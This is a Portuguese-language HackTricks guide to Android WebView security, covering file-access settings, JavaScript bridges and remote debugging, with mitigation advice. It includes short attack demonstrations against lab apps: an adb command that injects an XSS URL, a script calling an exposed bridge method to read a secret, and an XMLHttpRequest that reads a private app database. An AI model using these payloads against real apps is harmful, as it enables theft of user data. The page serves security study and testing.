# Webview Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Guia sobre Configura√ß√µes e Seguran√ßa do WebView

### Vis√£o Geral das Vulnerabilidades do WebView

Um aspecto cr√≠tico do desenvolvimento Android envolve o manuseio correto dos WebViews. Este guia destaca configura√ß√µes chave e pr√°ticas de seguran√ßa para mitigar riscos associados ao uso do WebView.

![WebView Example](<../../.gitbook/assets/image (1190).png>)

### **Acesso a Arquivos em WebViews**

Por padr√£o, os WebViews permitem acesso a arquivos. Essa funcionalidade √© controlada pelo m√©todo `setAllowFileAccess()`, dispon√≠vel desde o n√≠vel de API 3 do Android (Cupcake 1.5). Aplicativos com a permiss√£o **android.permission.READ\_EXTERNAL\_STORAGE** podem ler arquivos do armazenamento externo usando um esquema de URL de arquivo (`file://path/to/file`).

#### **Recursos Obsoletos: Acesso Universal e Acesso a Arquivos de URLs**

* **Acesso Universal de URLs de Arquivo**: Este recurso obsoleto permitia solicita√ß√µes de origem cruzada de URLs de arquivo, representando um risco significativo de seguran√ßa devido a poss√≠veis ataques XSS. A configura√ß√£o padr√£o est√° desativada (`false`) para aplicativos que visam Android Jelly Bean e vers√µes mais recentes.
* Para verificar essa configura√ß√£o, use `getAllowUniversalAccessFromFileURLs()`.
* Para modificar essa configura√ß√£o, use `setAllowUniversalAccessFromFileURLs(boolean)`.
* **Acesso a Arquivos de URLs de Arquivo**: Este recurso, tamb√©m obsoleto, controlava o acesso ao conte√∫do de outras URLs de esquema de arquivo. Assim como o acesso universal, seu padr√£o √© desativado para maior seguran√ßa.
* Use `getAllowFileAccessFromFileURLs()` para verificar e `setAllowFileAccessFromFileURLs(boolean)` para definir.

#### **Carregamento Seguro de Arquivos**

Para desabilitar o acesso ao sistema de arquivos enquanto ainda acessa ativos e recursos, o m√©todo `setAllowFileAccess()` √© utilizado. Com Android R e vers√µes superiores, a configura√ß√£o padr√£o √© `false`.

* Verifique com `getAllowFileAccess()`.
* Ative ou desative com `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

A classe **WebViewAssetLoader** √© a abordagem moderna para carregar arquivos locais. Ela usa URLs http(s) para acessar ativos e recursos locais, alinhando-se √† pol√≠tica de Mesma Origem, facilitando assim a gest√£o de CORS.

### loadUrl

Esta √© uma fun√ß√£o comum usada para carregar URLs arbitr√°rias em um webview:
```java
webview.loadUrl("<url here>")
```
Ofc, um potencial atacante nunca deve ser capaz de **controlar a URL** que um aplicativo vai carregar.

### **Manipula√ß√£o de JavaScript e Intent Scheme**

* **JavaScript**: Desativado por padr√£o em WebViews, pode ser ativado via `setJavaScriptEnabled()`. Cuidado √© aconselhado, pois ativar JavaScript sem as devidas salvaguardas pode introduzir vulnerabilidades de seguran√ßa.
* **Intent Scheme**: WebViews podem manipular o esquema `intent`, potencialmente levando a explora√ß√µes se n√£o forem gerenciadas com cuidado. Uma vulnerabilidade de exemplo envolveu um par√¢metro WebView exposto "support\_url" que poderia ser explorado para executar ataques de cross-site scripting (XSS).

![Vulnerable WebView](<../../.gitbook/assets/image (1191).png>)

Exemplo de explora√ß√£o usando adb:

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView ‚Äìes support_url "https://example.com/xss.html"
```
{% endcode %}

### Javascript Bridge

Um recurso √© fornecido pelo Android que permite que **JavaScript** em um WebView invoque **fun√ß√µes nativas de aplicativos Android**. Isso √© alcan√ßado utilizando o m√©todo `addJavascriptInterface`, que integra JavaScript com funcionalidades nativas do Android, denominado como um _WebView JavaScript bridge_. Cuidado √© aconselhado, pois este m√©todo permite que todas as p√°ginas dentro do WebView acessem o objeto de Interface JavaScript registrado, representando um risco de seguran√ßa se informa√ß√µes sens√≠veis forem expostas atrav√©s dessas interfaces.

* **Extrema cautela √© necess√°ria** para aplicativos que visam vers√µes do Android abaixo de 4.2 devido a uma vulnerabilidade que permite a execu√ß√£o remota de c√≥digo atrav√©s de JavaScript malicioso, explorando reflex√£o.

#### Implementando um JavaScript Bridge

* **Interfaces JavaScript** podem interagir com c√≥digo nativo, como mostrado nos exemplos onde um m√©todo de classe √© exposto ao JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
* A ponte JavaScript √© ativada adicionando uma interface ao WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
* A explora√ß√£o potencial atrav√©s do JavaScript, por exemplo, via um ataque XSS, permite a chamada de m√©todos Java expostos:
```html
<script>alert(javascriptBridge.getSecret());</script>
```
* Para mitigar riscos, **restrinja o uso da ponte JavaScript** ao c√≥digo enviado com o APK e impe√ßa o carregamento de JavaScript de fontes remotas. Para dispositivos mais antigos, defina o n√≠vel m√≠nimo da API para 17.

### Execu√ß√£o Remota de C√≥digo Baseada em Reflex√£o (RCE)

* Um m√©todo documentado permite alcan√ßar RCE atrav√©s da reflex√£o, executando um payload espec√≠fico. No entanto, a anota√ß√£o `@JavascriptInterface` impede o acesso n√£o autorizado a m√©todos, limitando a superf√≠cie de ataque.

### Depura√ß√£o Remota

* **Depura√ß√£o remota** √© poss√≠vel com **Chrome Developer Tools**, permitindo intera√ß√£o e execu√ß√£o arbitr√°ria de JavaScript dentro do conte√∫do do WebView.

#### Habilitando a Depura√ß√£o Remota

* A depura√ß√£o remota pode ser habilitada para todos os WebViews dentro de um aplicativo por:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
* Para habilitar condicionalmente a depura√ß√£o com base no estado de depura√ß√£o do aplicativo:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrar arquivos arbitr√°rios

* Demonstra a exfiltra√ß√£o de arquivos arbitr√°rios usando um XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## Refer√™ncias

* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)
* [https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
* [https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
